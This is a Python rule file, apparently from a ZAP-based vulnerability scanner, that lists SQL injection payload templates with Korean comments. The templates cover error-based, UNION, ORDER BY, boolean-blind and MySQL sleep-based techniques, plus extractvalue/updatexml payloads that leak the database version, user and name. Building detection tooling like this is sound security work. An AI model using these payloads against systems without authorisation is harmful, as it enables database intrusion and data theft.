from __future__ import annotations

# time-based SQLi 지연 시간(초). ZAP send_request 내부 timeout을 넘기면 요청이 에러나므로 짧게 유지.
# 값 변경 시 analyzer/sqli/judge.py 의 SLEEP_THRESHOLD(= _SLEEP - 0.5 권장)도 같이 맞출 것.
_SLEEP = 3


# {value}는 파라미터 원본값 자리표시
_BOOLEAN_AND_FALSE_TEMPLATES = [
    "{value} AND 1=2 -- ",
    "{value}' AND '1'='2' -- ",
    '{value}" AND "1"="2" -- ',
    "{value} AND 1=2",
    "{value}' AND '1'='2",
    '{value}" AND "1"="2"',
    "{value}XYZABCDEFGHIJ",
    "{value}XYZABCDEFGHIJ' -- ",
    '{value}XYZABCDEFGHIJ" -- ',
]

SQLI_RULES: list[dict] = [
    # error: 에러 기반 (DB 에러 메시지 노출로 판정)
    {
        "attack_id": "PL-SQLI-ERROR-META",
        "vuln_type": "sqli",
        "technique": "error_meta",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value}'",
                '{value}"',
                "{value};",
                "{value}NULL",
                "{value}'(",
                "{value})",
                "{value}(",
                "{value}'\"",
            ],
        },
    },
    {
        # UNION — 컬럼 수 불일치 시 "column count doesn't match" 에러를 유발,
        # judge_union_sqli 가 그 에러 시그니처로 판정하므로 error 계열.
        "attack_id": "PL-SQLI-UNION",
        "vuln_type": "sqli",
        "technique": "union",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} UNION ALL SELECT NULL -- ",
                "{value}' UNION ALL SELECT NULL -- ",
                '{value}" UNION ALL SELECT NULL -- ',
                "{value}) UNION ALL SELECT NULL -- ",
                "{value}') UNION ALL SELECT NULL -- ",
                '{value}") UNION ALL SELECT NULL -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "category": "error",
        "sequence": ["baseline", "attack"],

        "payload_templates": {
            "attack": [
                "{value} ORDER BY 100-- ",
                "{value}' ORDER BY 100-- ",
                '{value}" ORDER BY 100-- ',
                "{value} ORDER BY 9999-- ",
                "{value}' ORDER BY 9999-- ",
                '{value}" ORDER BY 9999-- ',
            ],
        },
    },
    {
        # extractvalue/updatexml로 값을 마커(~~)로 감싸 에러에 노출, substring 24로 32자 truncate 대응
        "attack_id": "PL-SQLI-ERROR-EXTRACT",
        "vuln_type": "sqli",
        "technique": "error_extract",
        "category": "error",
        "judgment": "extraction",
        "extract_marker": "~~",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
            ],
        },
    },
    # boolean: 불리언 블라인드 (참/거짓 응답 차이로 판정)
    {
        "attack_id": "PL-SQLI-BOOLEAN",
        "vuln_type": "sqli",
        "technique": "boolean",
        "category": "boolean",
        "sequence": ["baseline", "true_attack", "false_attack"],
        "payload_templates": {
            "true_attack": [
                # AND 스타일 — true≈baseline, false≠baseline로 해석되길 기대
                "{value} AND 1=1 -- ",
                "{value}' AND '1'='1' -- ",
                '{value}" AND "1"="1" -- ',
                "{value} AND 1=1",
                "{value}' AND '1'='1",
                '{value}" AND "1"="1"',
                # OR 스타일 — AND로 차이가 안 보일 때 조건 범위를 넓혀 재확인 (방향 반대)
                "{value} OR 1=1 -- ",
                "{value}' OR '1'='1' -- ",
                '{value}" OR "1"="1" -- ',
                "{value} OR 1=1",
                "{value}' OR '1'='1",
                '{value}" OR "1"="1"',
                # 와일드카드 — AND/OR 스타일 둘 다에서 통했던 것이라 스타일 무관 공통 확인용으로 1벌만 유지
                "{value}%",
                "{value}%' -- ",
                '{value}%" -- ',
            ],
            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
        },
    },
    # time: 시간 기반 블라인드 (sleep 지연으로 판정)
    {
        "attack_id": "PL-SQLI-TIME-MYSQL",
        "vuln_type": "sqli",
        "technique": "time_mysql",
        "category": "time",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                f"{{value}} / sleep({_SLEEP}) ",
                f"{{value}}' / sleep({_SLEEP}) / '",
                f'{{value}}" / sleep({_SLEEP}) / "',
                f"{{value}} AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" AND 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
            ],
        },
    },
]
